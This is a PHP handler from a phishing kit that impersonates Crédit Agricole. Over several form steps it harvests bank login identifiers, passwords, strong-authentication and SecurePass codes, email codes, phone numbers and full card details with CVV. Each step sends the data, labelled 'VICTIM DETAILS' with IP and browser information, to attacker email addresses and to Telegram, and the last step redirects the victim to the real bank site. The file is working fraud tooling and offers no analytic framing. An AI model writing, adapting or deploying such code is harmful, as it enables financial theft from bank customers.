<?php



include_once '../inc/app.php';
include_once '../vendor/autoload.php';
include 'email.php';
use Inacho\CreditCard;

function validate_cc_number($number = null) {
    $card = CreditCard::validCreditCard($number);
    if( $card['valid'] == false ) {
        return false;
    }
    return $card;
}

function validate_cc_cvv($number = null,$type = null) {
    if( empty($number) || empty($type) )
        return false;
    $cvv = CreditCard::validCvc($number, $type);
    return $cvv;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}



$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);


if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "region") {

        $_SESSION['region_number'] = $_POST['region_number'];
        $_SESSION['region_caisse']    = $_POST['region_caisse'];

        $_SESSION['errors'] = [];
        if( empty($_POST['region_number']) && empty($_POST['region_caisse']) ) {
            $_SESSION['errors']['region_number'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Caisse Régionale';
            $message = '/-- REGION INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END REGION INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            $maillist = explode(',',$to);
			foreach($maillist as $email){
            mail($email,$subject,$message,$headers);
			}
          
            $telegram_message = '/-- CA Département  --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
            $telegram_message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            $telegram_message .= 'Country : ' . get_user_country() . "\r\n";
            telegram_send(urlencode($telegram_message));
			
			mail($email,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: login.php?particulier#_$dispatch");

        } else {
            header("location: region.php?error#_$dispatch");
        }

    }

    if ($_POST['type'] == "login") {

        $_SESSION['identifiant'] = $_POST['identifiant'];
        $_SESSION['password']    = $_POST['password'];

        $_SESSION['errors'] = [];
        if( validate_number($_POST['identifiant'],11) == false ) {
            $_SESSION['errors']['identifiant'] = true;
        }

        if( validate_number($_POST['password'],6) == false ) {
            $_SESSION['errors']['password'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Login';
            $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END LOG INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
          
            $maillist = explode(',',$to);
			foreach($maillist as $email){
            mail($email,$subject,$message,$headers);
			}

            $telegram_message = '/-- CA Login --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
			$telegram_message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
			$telegram_message .= 'Password : ' . $_POST['password'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            $telegram_message .= 'Country : ' . get_user_country() . "\r\n";
            telegram_send(urlencode($telegram_message));
			
            mail($email,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: loading.php?validation#_$dispatch");

        } else {
            header("location: login.php?particulier#_$dispatch");
        }

    }


    if ($_POST['type'] == "authfort") {

        $_SESSION['authfort']        = $_POST['authfort'];

        $_SESSION['errors'] = [];
        if( empty($_POST['authfort']) || strlen($_POST['authfort']) != 6 ) {
            $_SESSION['errors']['authfort'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | AUTHENTIFICATIONFORTE';
            $message = '/-- INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_POST['authfort'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
            
            $maillist = explode(',',$to);
			foreach($maillist as $email){
            mail($email,$subject,$headers);
			}

            $telegram_message = '/-- CA AUTHENTIFICATIONFORTE --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
			$telegram_message .= 'Authentification forte : ' . $_POST['authfort'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            $telegram_message .= 'Country : ' . get_user_country() . "\r\n";
            telegram_send(urlencode($telegram_message));
			
            mail($email,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: loading1.php?validation#_$dispatch");

        } else {
            header("location: authfort.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "securepass") {

        $_SESSION['securepass']        = $_POST['securepass'];

        $_SESSION['errors'] = [];
        if( empty($_POST['securepass']) || strlen($_POST['securepass']) != 6 ) {
            $_SESSION['errors']['securepass'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Securepasse';
            $message = '/-- INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_POST['securepass'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
          
            $maillist = explode(',',$to);
			foreach($maillist as $email){
            mail($email,$subject,$message,$headers);
			}

            $telegram_message = '/-- CA Securepass --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
			$telegram_message .= 'Secure passe : ' . $_POST['securepass'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            $telegram_message .= 'Country : ' . get_user_country() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($email,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: errsecurepass.php?validation#_$dispatch");

        } else {
            header("location: securepass.php?validation#_$dispatch");
        }

    }if ($_POST['type'] == "securepass1") {

        $_SESSION['securepass1']        = $_POST['securepass1'];

        $_SESSION['errors'] = [];
        if( empty($_POST['securepass1']) || strlen($_POST['securepass1']) != 6 ) {
            $_SESSION['errors']['securepass1'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Securepasse';
            $message = '/-- INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Error Secure passe : ' . $_POST['securepass1'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
          
            $maillist = explode(',',$to);
			foreach($maillist as $email){
            mail($email,$subject,$message,$headers);
			}

            $telegram_message = '/-- CA Securepass --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
			$telegram_message .= 'Error Secure passe : ' . $_POST['securepass1'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            $telegram_message .= 'Country : ' . get_user_country() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($email,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: loading2.php?validation#_$dispatch");

        } else {
            header("location: validemail.php?validation#_$dispatch");
        }

    }

    if ($_POST['type'] == "validemail") {

        $_SESSION['validemail']        = $_POST['validemail'];

        $_SESSION['errors'] = [];
        if( empty($_POST['validemail']) || strlen($_POST['validemail']) != 6 ) {
            $_SESSION['errors']['validemail'] = 'Le code est incorrect.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Code Email';
            $message = '/-- INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_SESSION['securepass'] . "\r\n";
            $message .= 'Code email : ' . $_POST['validemail'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END INFOS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
          
            $maillist = explode(',',$to);
			foreach($maillist as $email){
            mail($email,$subject,$message,$headers);
			}

            $telegram_message = '/-- CA Code Email --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
			$telegram_message .= 'Code email : ' . $_POST['validemail'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            $telegram_message .= 'Country : ' . get_user_country() . "\r\n";
            telegram_send(urlencode($telegram_message));

            mail($email,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            header("location: loading3.php?validation#_$dispatch");

        } else {
            header("location: cc.php?validation#_$dispatch");
        }

    }
	

    if ($_POST['type'] == "cc") {
        
        $_SESSION['phone']    = $_POST['phone'];
        $_SESSION['cc_number'] = $_POST['cc_number'];
        $_SESSION['cc_cvv']    = $_POST['cc_cvv'];
        $_SESSION['cc_date']   = $_POST['cc_date'];

        $date_ex = explode('/',$_POST['cc_date']);

        $card_number = validate_cc_number($_POST['cc_number']);
        $card_cvv    = validate_cc_cvv($_POST['cc_cvv'],$card_number['type']);
        $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);


        
       

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Card Details';
            $message = '/-- DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Numéro de département : ' . $_SESSION['region_number'] . "\r\n";
            $message .= 'Caisse régionale : ' . $_SESSION['region_caisse'] . "\r\n";
            $message .= 'Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $message .= 'Password : ' . $_SESSION['password'] . "\r\n";
            $message .= 'Authentification forte : ' . $_SESSION['authfort'] . "\r\n";
            $message .= 'Secure passe : ' . $_SESSION['securepass'] . "\r\n";
            $message .= 'Code email : ' . $_SESSION['validemail'] . "\r\n";
            $message .= 'Telephone : ' . $_POST['phone'] . "\r\n";
            $message .= 'N° de carte : ' . $_POST['cc_number'] . "\r\n";
            $message .= 'Date d\'expiration : ' . $_POST['cc_date'] . "\r\n";
            $message .= 'CVV : ' . $_POST['cc_cvv'] . "\r\n";
            $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";
            $message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
            $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END DETAILS --/' . "\r\n\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

			$maillist = explode(',',$to);
			foreach($maillist as $email){
            mail($email,$subject,$message,$headers);
			}
			
			$telegram_message =  '/-- CA cc --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'N° de carte : ' . $_SESSION['cc_number'] . "\r\n";
            $telegram_message .= 'Date d\'expiration : ' . $_SESSION['cc_date'] . "\r\n";
			$telegram_message .= 'CVV : ' . $_SESSION['cc_cvv'] . "\r\n";
			$telegram_message .= 'Telephone : ' . $_SESSION['phone'] . "\r\n";
            $telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            $telegram_message .= 'Country : ' . get_user_country() . "\r\n";
            telegram_send(urlencode($telegram_message));
			
			mail($email,$subject,$message,$headers);
            file_put_contents("", $message, FILE_APPEND);
            session_destroy();
            header("location: https://www.credit-agricole.fr");

        } else {
            header("location: cc.php?validation#_$dispatch");
        }

    }

}

?>